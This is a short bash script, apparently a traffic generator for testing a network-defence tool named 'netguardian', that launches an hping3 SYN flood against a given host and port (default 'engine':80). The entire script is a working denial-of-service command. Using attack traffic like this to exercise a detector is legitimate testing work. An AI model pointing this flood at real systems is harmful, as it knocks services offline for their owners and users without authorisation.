#!/usr/bin/env bash
set -euo pipefail

TARGET_HOST="${1:-engine}"
TARGET_PORT="${2:-80}"

echo "[netguardian] Starting SYN flood simulation against ${TARGET_HOST}:${TARGET_PORT}"
exec hping3 -S --flood -p "${TARGET_PORT}" "${TARGET_HOST}"
